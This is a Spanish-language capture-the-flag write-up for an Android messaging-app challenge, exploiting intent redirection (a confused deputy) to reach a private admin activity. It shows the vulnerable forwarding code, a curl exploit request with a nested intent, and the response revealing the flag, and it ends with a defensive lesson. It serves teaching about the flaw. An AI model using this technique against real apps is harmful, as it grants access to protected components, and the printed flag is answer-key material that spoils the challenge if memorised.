# Phantom Thread — Write-up

- **CTF:** FluidAttacks CTF 2026
- **Categoría:** Mobile · **Dificultad:** Medium
- **Flag:** `flag{262e2a453ef2cb27}`

## Enunciado

> FluidMsg is a messaging app. Here are its decompiled Java sources and
> AndroidManifest.xml. There's no real phone here, so a little API plays the part of
> Android's intent resolver: POST an intent as JSON to `/api/intent/send` and the
> simulated app reacts. (`/api/manifest`, `/api/info`, `/api/activities` describe the
> target.)

La fuente Java llega dentro de un ZIP WinZip-AES (contraseña `infected`).

## 1. El componente objetivo

En el `AndroidManifest.xml`, la actividad que muestra la flag es **privada**:

```xml
<activity
    android:name=".AdminPanelActivity"
    android:exported="false"
    android:permission="com.fluidctf.messenger.permission.ADMIN" />
```

`AdminPanelActivity` no está exportada y está protegida por un permiso de firma; al
abrirse recupera la flag del backend (`GET /api/admin/flag` con un token interno). Un
atacante externo no puede lanzarla directamente.

## 2. El confused deputy

Existe una actividad **exportada** que reenvía intents sin validar el destino:

```xml
<activity android:name=".sdk.AnalyticsRedirectActivity" android:exported="true">
    <intent-filter>
        <action android:name="com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT" />
    </intent-filter>
</activity>
```

```java
// AnalyticsRedirectActivity.handleRedirect()
Intent next = incoming.getParcelableExtra("next_intent");
if (next != null) {
    startActivity(next);   // <-- lanza un Intent controlado por el atacante
}
```

Como el `startActivity()` lo ejecuta la propia app, el intent reenviado se lanza con la
identidad y permisos de la aplicación. Esto es **Intent Redirection / confused deputy**
(CWE-926/927): permite alcanzar componentes no exportados o protegidos por permiso.

## 3. Explotación

El reto simula el intent resolver de Android vía `POST /api/intent/send`. Enviamos un
intent a la actividad exportada con un `next_intent` anidado que apunta a la actividad
privada:

```bash
curl -s -X POST https://<target>/api/intent/send \
  -H 'Content-Type: application/json' -d '{
  "component":"com.fluidctf.messenger/.sdk.AnalyticsRedirectActivity",
  "action":"com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT",
  "extras":{"next_intent":{"component":"com.fluidctf.messenger/.AdminPanelActivity"}}
}'
```

Comprobación previa: un intent directo a `.AdminPanelActivity` se rechaza
(`"... is not exported. Cannot be launched from external intent."`). Vía el redirect,
en cambio:

```json
{"activity":"com.fluidctf.messenger.AdminPanelActivity",
 "api_response":{"data":"flag{262e2a453ef2cb27}","endpoint":"/api/admin/flag"},
 "result":"Admin panel accessed successfully.","status":"launched"}
```

## Lección

Nunca hagas `startActivity()` (ni `sendBroadcast`, etc.) con un `Intent` que provenga
de una fuente externa sin validar su componente/acción de destino. Una actividad
exportada que reenvía intents se convierte en un puente hacia los componentes privados
de la app.
